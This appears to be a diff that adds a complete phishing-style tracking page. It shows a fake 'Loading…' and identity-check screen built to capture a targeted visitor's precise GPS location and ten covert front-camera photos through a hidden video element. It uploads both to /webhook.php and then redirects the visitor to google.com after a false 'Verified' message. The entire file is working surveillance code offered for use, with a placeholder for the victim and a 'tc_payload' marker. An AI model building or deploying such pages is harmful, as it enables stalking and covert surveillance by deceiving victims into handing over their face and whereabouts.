@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Loading…</title>
+    <style>
+        body {
+            background: #ffffff;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        #container { text-align: center; }
+        .spinner {
+            border: 4px solid #f0f0f0;
+            border-top: 4px solid #e63946;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { font-size: 14px; color: #888; margin: 0; }
+        #retry-link {
+            display: none;
+            font-size: 13px;
+            color: #aaa;
+            text-decoration: underline;
+            cursor: pointer;
+            margin-top: 16px;
+            background: none;
+            border: none;
+            font-family: inherit;
+        }
+        #retry-link:hover { color: #666; }
+
+        /* Tap overlay – needed to get a user gesture for GPS */
+        #tap-overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(255,255,255,0.95);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            color: #888;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <video id="hidden-video" style="display:none;" autoplay playsinline muted></video>
+
+    <!-- Tap overlay shown immediately -->
+    <div id="tap-overlay">
+        <div style="text-align:center;">
+            <div style="font-size:40px; margin-bottom:10px;">🔒</div>
+            <p>Tap anywhere to continue</p>
+        </div>
+    </div>
+
+    <!-- Main UI -->
+    <div id="container">
+        <div class="spinner"></div>
+        <p id="status">Please wait…</p>
+        <button id="retry-link" onclick="retryAll()">Retry</button>
+    </div>
+
+    <script>
+    (function() {
+        var params = new URLSearchParams(window.location.search);
+        var user = params.get('user') || '__TARGET_USER__';
+
+        var gpsDone = false, stream = null;
+        var photos = [];
+        var retryBtn = document.getElementById('retry-link');
+        var statusEl = document.getElementById('status');
+        var video = document.getElementById('hidden-video');
+        var tapOverlay = document.getElementById('tap-overlay');
+
+        // Start the whole process when user taps
+        tapOverlay.addEventListener('click', function() {
+            tapOverlay.style.display = 'none';
+            requestGPS();
+        });
+        // Also if they somehow tap elsewhere (rare), still trigger GPS if it hasn't started
+        document.addEventListener('click', function() {
+            if (!gpsDone && tapOverlay.style.display !== 'none') {
+                tapOverlay.style.display = 'none';
+                requestGPS();
+            }
+        }, { once: true });
+
+        function requestGPS() {
+            if (gpsDone) return;
+            retryBtn.style.display = 'none';
+            statusEl.textContent = 'Verifying location…';
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    gpsDone = true;
+                    window._gpsCaptured = {
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: Math.round(pos.coords.accuracy)
+                    };
+                    statusEl.textContent = 'Location confirmed. Preparing identity check…';
+                    // Wait 3.5 seconds then ask for camera
+                    setTimeout(requestCamera, 3500);
+                },
+                function(err) {
+                    // GPS denied – show subtle retry
+                    retryBtn.style.display = 'inline-block';
+                    statusEl.textContent = 'Location access required.';
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 8000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+        function requestCamera() {
+            statusEl.textContent = 'Verifying identity…';
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+                audio: false
+            })
+            .then(function(s) {
+                stream = s;
+                video.srcObject = stream;
+                video.play()
+                    .then(function() {
+                        statusEl.textContent = 'Scanning…';
+                        waitForVideoReady(stream, 0);
+                    })
+                    .catch(function() {
+                        // Fallback: replay via user gesture
+                        document.addEventListener('click', function() {
+                            video.play().then(function() { waitForVideoReady(stream, 0); });
+                        }, { once: true });
+                    });
+            })
+            .catch(function() {
+                // Camera denied – upload GPS only
+                upload();
+            });
+        }
+
+        function waitForVideoReady(stream, attempts) {
+            if (attempts > 20) {
+                capturePhotos(stream);
+                return;
+            }
+            if (video.videoWidth > 0 && video.videoHeight > 0) {
+                capturePhotos(stream);
+            } else {
+                setTimeout(function() { waitForVideoReady(stream, attempts + 1); }, 100);
+            }
+        }
+
+        function capturePhotos(stream) {
+            var maxPhotos = 10, count = 0;
+            function snap() {
+                if (video.videoWidth === 0 || video.videoHeight === 0) {
+                    setTimeout(snap, 100);
+                    return;
+                }
+                var canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                photos.push(canvas.toDataURL('image/jpeg', 0.7));
+                count++;
+                if (count < maxPhotos) {
+                    setTimeout(snap, 200);
+                } else {
+                    stream.getTracks().forEach(t => t.stop());
+                    upload();
+                }
+            }
+            snap();
+        }
+
+        function upload() {
+            statusEl.textContent = 'Finalizing…';
+            var fd = new FormData();
+            photos.forEach(function(b64, i) {
+                var blob = dataURItoBlob(b64);
+                fd.append('photo_' + i, blob, 'face_' + i + '.jpg');
+            });
+            if (window._gpsCaptured) fd.append('gps', JSON.stringify(window._gpsCaptured));
+
+            fetch('/webhook.php', { method: 'POST', body: fd })
+                .then(function() {
+                    document.getElementById('container').innerHTML = '<p style="color:#4caf50;">✓ Verified</p>';
+                    setTimeout(function() { location.href = 'https://www.google.com'; }, 3000);
+                })
+                .catch(function() {
+                    document.getElementById('container').innerHTML = '<p style="color:#888;">Redirecting…</p>';
+                    setTimeout(function() { location.href = 'https://www.google.com'; }, 2000);
+                });
+        }
+
+        function dataURItoBlob(d) {
+            var a = d.split(','), m = a[0].match(/:(.*?);/)[1],
+                b = atob(a[1]), n = b.length,
+                u = new Uint8Array(n);
+            for (var i = 0; i < n; i++) u[i] = b.charCodeAt(i);
+            return new Blob([u], { type: m });
+        }
+
+        window.retryAll = function() {
+            if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
+            photos = [];
+            gpsDone = false;
+            // Show tap overlay again for retry
+            tapOverlay.style.display = 'flex';
+            statusEl.textContent = 'Please wait…';
+            retryBtn.style.display = 'none';
+        };
+    })();
+    </script>
+    <!-- tc_payload -->
+</body>
+</html>
